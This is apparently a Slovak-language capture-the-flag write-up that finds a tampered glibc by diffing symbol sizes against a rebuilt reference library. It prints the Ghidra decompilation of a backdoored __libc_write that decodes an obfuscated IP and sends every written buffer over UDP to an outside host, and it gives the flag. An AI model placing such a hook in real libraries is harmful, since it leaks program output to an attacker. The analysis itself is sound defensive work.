# Zadanie

EN: Analyst Log – 17:23 PM: I followed the execution trail. It ended in the most cursed way imaginable: custom libc. Who writes their own libc? What kind of monster wakes up and chooses that? Greg is tired. Greg is afraid. Greg wants his weekend back.

SK: Záznam analytika – 17:23 : Sledoval som stopu vykonávania. Skončila tým najprekliatejším spôsobom, aký si vieš predstaviť: vlastná libc. Kto si píše vlastnú libc? Aký typ netvora sa ráno zobudí a povie si, že dnes je na to ten deň? Greg je unavený. Greg sa bojí. Greg chce späť svoj víkend.

## Riešenie

Z predošlej úlohy máme stiahnutý custom lib.so. Má 11 MB a toto mi o ňom hovorí 

```bash
majino@majino:/mnt/e/CTFs/Cybergame2025/Greg$ file lib.so
lib.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /opt/glibc-custom/lib/ld-linux-x86-64.so.2, BuildID[sha1]=12c79ac0de8e78fcabc90f37ffbf5c177385f5cf, for GNU/Linux 3.2.0, with debug_info, not stripped
```

```bash
majino@majino:/mnt/e/CTFs/Cybergame2025/Greg$ strings lib.so | grep "release version"
GNU C Library (GNU libc) stable release version 2.41.
```

```bash
majino@majino:/mnt/e/CTFs/Cybergame2025/Greg$ readelf -p .comment lib.so

String dump of section '.comment':
  [     0]  GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0
```

Viem, že ide o nejakú custom libc, ktorá je zbuildená s debug info a je non stripped. Aby som zistil v čom je táto iná, tak najlepšie bude si rovnakú ale pôvodnú zbuildiť. Viem teda, že bola zbuildená verziou gcc 13.3.0 na ubuntu 24.04.

Sériou týchto príkazov viem vytvoriť originál libc.so 

```bash
sudo docker run -it --name glibc-241-build ubuntu:24.04 bash
apt-get update
apt-get install -y build-essential gcc-13 g++-13 libc6-dev binutils file gawk bison python3 make wget xz-utils texinfo
cd ~
wget https://ftp.gnu.org/gnu/glibc/glibc-2.41.tar.gz
tar xvf glibc-2.41.tar.gz
mkdir glibc-build && cd glibc-build
export CC=gcc-13
export CXX=g++-13
export CFLAGS="-O2 -g -fno-ident -fno-record-gcc-switches -frandom-seed=0"
../glibc-2.41/configure --prefix=/home/kali/glibc/glibc-2.41-reference-install
make -j$(nproc)
make install


potom otvorit druhe terminal okno
sudo docker ps

vrati napriklad
CONTAINER ID   IMAGE          COMMAND   CREATED          STATUS          PORTS     NAMES
8d7340f2c9a4   ubuntu:24.04   "bash"    11 minutes ago   Up 11 minutes             glibc-241-build

sudo docker cp glibc-241-build:/root/glibc-build/libc.so /mnt/e/CTFs/Cybergame2025/Greg/
Successfully copied 11.5MB to /mnt/e/CTFs/Cybergame2025/Greg/
```

Mám teda originál libc. Idem porovnať. V jednom priečinku potrebujem originál zbuildený libc.so a herný custom lib.so. Zadám príkazy

```bash
nm -D libc.so | sort > original_symbols.txt
nm -D lib.so | sort > custom_symbols.txt
```

Vygeneruje mi dva súbory. Zavolám tento python skript, ktorý mi z oboch výstupov podľa adries symbolov zistí ich veľkosti, porovná ich medzi sebov - origo voči custom libke a zoradí od najviac pridaných bajtov po najviac ubraných bajtov v custom libke a zobrazí symbol, rozdiel a jeho adresu v custom libke

```python
import sys

# Funkcia na načítanie symbolov zo súboru
def load_symbols(filename):
    symbols = []
    with open(filename, 'r') as f:
        for line in f:
            parts = line.strip().split()
            if len(parts) < 3:
                continue
            address = int(parts[0], 16)
            symbol = parts[2]
            symbols.append((address, symbol))
    return symbols

# Funkcia na výpočet veľkostí symbolov podľa adresy
def calculate_sizes(symbols):
    sizes = {}
    sorted_symbols = sorted(symbols, key=lambda x: x[0])
    for i in range(len(sorted_symbols) - 1):
        current_address, symbol = sorted_symbols[i]
        next_address, _ = sorted_symbols[i + 1]
        sizes[symbol] = (current_address, next_address - current_address)
    return sizes

# Načítanie symbolov
original_symbols = load_symbols('original_symbols.txt')
custom_symbols = load_symbols('custom_symbols.txt')

# Výpočet veľkostí
original_sizes = calculate_sizes(original_symbols)
custom_sizes = calculate_sizes(custom_symbols)

# Porovnanie veľkostí
diff_sizes = []
for symbol in custom_sizes:
    if symbol in original_sizes:
        size_diff = custom_sizes[symbol][1] - original_sizes[symbol][1]
        if size_diff != 0:
            diff_sizes.append((symbol, size_diff, custom_sizes[symbol][0]))

# Zoradenie podľa veľkosti od najviac pridanej po najviac ubranej bajty
diff_sizes.sort(key=lambda x: x[1], reverse=True)

# Výpis výsledku
print(f"{'Symbol':<40} {'Size Diff (bytes)':>20} {'Custom Address':>20}")
print('-' * 80)
for symbol, size_diff, address in diff_sizes:
    print(f"{symbol:<40} {size_diff:>20} {hex(address):>20}")
```

Výstup je

```
Symbol                                      Size Diff (bytes)       Custom Address
--------------------------------------------------------------------------------
_nl_default_dirname@@GLIBC_2.2.5                         3440             0x19c590
write@@GLIBC_2.2.5                                        464              0xf5850
in6addr_any@@GLIBC_2.2.5                                  208             0x19d3a0
h_nerr@@GLIBC_2.2.5                                       160             0x19dfe4
catopen@@GLIBC_2.2.5                                       80              0x39db0
__xpg_strerror_r@@GLIBC_2.3.4                              32              0xa2080
__gconv_get_alias_db@@GLIBC_PRIVATE                       -48              0x27b40
__nptl_version@@GLIBC_PRIVATE                             -64             0x194509
_dl_mcount_wrapper@GLIBC_2.2.5                           -528             0x14fbe0
_itoa_lower_digits@@GLIBC_PRIVATE                       -3744             0x197680
```

V ghidre už mám načítanú a analyzovanú custom lib.so a idem podľa týchto adries pozrieť, ktorá funkcia sa nám zmenila a obsahuje niečo, čo nám dá vlajku. Tých funkcií veľa nie je....... Po chvíli som našiel, to čo potrebujem na symbole write 

```
write@@GLIBC_2.2.5     464     0xf5850
```

Kedže v ghidre vidím, že mi adresy začínaju adresou `0x00100000` stlačím `G`, vypýta adresu, zadám `1f5850` a hodí ma na `__libc_write`

```c
ssize_t __libc_write(int __fd,void *__buf,size_t __n)

{
  byte bVar1;
  byte bVar2;
  long lVar3;
  size_t sVar4;
  byte *pbVar5;
  uchar *puVar6;
  int iVar7;
  uchar s2 [14];
  char s3 [16];
  sockaddr_in addr;
  uchar s [29];

  if ((__buf != (void *)0x0) && (__n != 0)) {
    iVar7 = 0;
    s[0] = 0xea;
    s[1] = 0x6;
    s[2] = 0xe0;
    s[3] = 0x44;
    s[4] = 0x23;
    s[5] = 0x20;
    s[6] = 0x96;
    s[7] = 0xcc;
    s[8] = 0x1e;
    s[9] = 0xae;
    s[10] = 0x64;
    s[0xb] = 0xe3;
    s[0xc] = 0x0;
    s[0xd] = 0x9;
    s[0xe] = 0xeb;
    s[0xf] = 0x27;
    s[0x10] = 0xd5;
    s[0x11] = 0xd7;
    s[0x12] = 0xac;
    s[0x13] = 0x81;
    s[0x14] = 0xea;
    s[0x15] = 0xd5;
    s[0x16] = 0x5e;
    s[0x17] = 0xdf;
    s[0x18] = 0x5a;
    s[0x19] = 0xae;
    s[0x1a] = 0x2c;
    s[0x1b] = 0x14;
    s[0x1c] = 0xfc;
    pbVar5 = s;
    do {
      bVar1 = (byte)iVar7;
      bVar2 = (~(*pbVar5 ^ bVar1) - bVar1 ^ bVar1) + bVar1;
      iVar7 = iVar7 + 1;
      *pbVar5 = bVar1 - (((-((bVar2 * '\b' | bVar2 >> 5) + bVar1) ^ bVar1) - bVar1 ^ bVar1) + 0x81 ^
                        0x74);
      pbVar5 = pbVar5 + 1;
    } while (iVar7 != 0x1d);
    iVar7 = 0;
    s2[0] = 0x6;
    s2[1] = 0x9;
    s2[2] = 0xc;
    s2[3] = 0x85;
    s2[4] = 0x12;
    s2[5] = 0x8f;
    s2[6] = 0x82;
    s2[7] = 0x81;
    s2[8] = 0x16;
    s2[9] = 0x15;
    s2[10] = 0x91;
    s2[0xb] = 0x85;
    s2[0xc] = 0x90;
    s2[0xd] = 0x3c;
    puVar6 = s2;
    do {
      bVar1 = (byte)iVar7;
      bVar2 = -((((*puVar6 + bVar1 ^ bVar1) + 99 ^ bVar1) + 0x78 ^ 0x7f) + bVar1) ^ 0xe0;
      iVar7 = iVar7 + 1;
      *puVar6 = ((bVar2 << 1 | (char)bVar2 < '\0') ^ bVar1) + (',' - bVar1);
      puVar6 = puVar6 + 1;
    } while (iVar7 != 0xe);
    s3[8] = s2[8];
    s3[9] = s2[9];
    s3[10] = s2[10];
    s3[0xb] = s2[0xb];
    s3[0xc] = s2[0xc];
    s3[0xd] = s2[0xd];
    s3[6] = s2[6];
    s3[7] = s2[7];
    s3[0] = s2[0];
    s3[1] = s2[1];
    s3[2] = s2[2];
    s3[3] = s2[3];
    s3[4] = s2[4];
    s3[5] = s2[5];
    s3[0xe] = '\0';
    s3[0xf] = '\0';
    iVar7 = FUN_00124660(0x29,2,2);
    if (-1 < iVar7) {
      addr.sin_addr.s_addr = 0;
      addr.sin_zero[0] = '\0';
      addr.sin_zero[1] = '\0';
      addr.sin_zero[2] = '\0';
      addr.sin_zero[3] = '\0';
      addr.sin_zero[4] = '\0';
      addr.sin_zero[5] = '\0';
      addr.sin_zero[6] = '\0';
      addr.sin_zero[7] = '\0';
      addr.sin_family = 2;
      addr.sin_port = 0x3500;
      __inet_pton(2,s3,&addr.sin_addr);
      sVar4 = strlen_ifunc((char *)s);
      FUN_00124660(0x2c,iVar7,s,sVar4,0,&addr,0x10);
      FUN_00124660(0x2c,iVar7,__buf);
      FUN_00124660(3,iVar7);
    }
  }
  lVar3 = __syscall_cancel((long)__fd,(__syscall_arg_t)__buf,__n,0,0,0,1);
  return lVar3;
}
```

Čo sa skrýva v s, s2 a s3 mi povie tento python skript

```python
s = bytearray([
    0xea, 0x06, 0xe0, 0x44, 0x23, 0x20, 0x96, 0xcc,
    0x1e, 0xae, 0x64, 0xe3, 0x00, 0x09, 0xeb, 0x27,
    0xd5, 0xd7, 0xac, 0x81, 0xea, 0xd5, 0x5e, 0xdf,
    0x5a, 0xae, 0x2c, 0x14, 0xfc
])

for i in range(len(s)):
    b1 = i & 0xff
    old = s[i]
    b2 = (((~(old ^ b1) - b1) ^ b1) + b1) & 0xff
    part = ((b2 << 3) | (b2 >> 5)) & 0xff
    val = (((-((part + b1) & 0xff)) ^ b1) - b1) ^ b1
    val = ((val + 0x81) ^ 0x74) & 0xff
    s[i] = (b1 - val) & 0xff

s2 = bytearray([
    0x06, 0x09, 0x0c, 0x85, 0x12, 0x8f, 0x82, 0x81,
    0x16, 0x15, 0x91, 0x85, 0x90, 0x3c
])

for i in range(len(s2)):
    b1 = i & 0xff
    v = s2[i]
    inner = (((((v + b1) ^ b1) + 99) ^ b1) + 0x78) ^ 0x7f
    inner = (inner + b1) & 0xff
    b2 = ((-inner) & 0xff) ^ 0xe0
    high_bit = 1 if (b2 & 0x80) else 0
    rol = ((b2 << 1) & 0xff) | high_bit
    s2[i] = ((rol ^ b1) + (44 - b1)) & 0xff

s3 = bytearray(16)
s3[:14] = s2


print("s  :", s.decode('ascii', errors='ignore'))
print("s2 :", s2.decode('ascii', errors='ignore'))
print("s3 :", s3.decode('ascii', errors='ignore'))
```

ktorého výstupom je

```
s  : SK-CERT{br1n6_y0ur_0wn_l1bc}
s2 : 195.168.112.4
s3 : 195.168.112.4
```

## Vlajka

```
SK-CERT{br1n6_y0ur_0wn_l1bc}
```
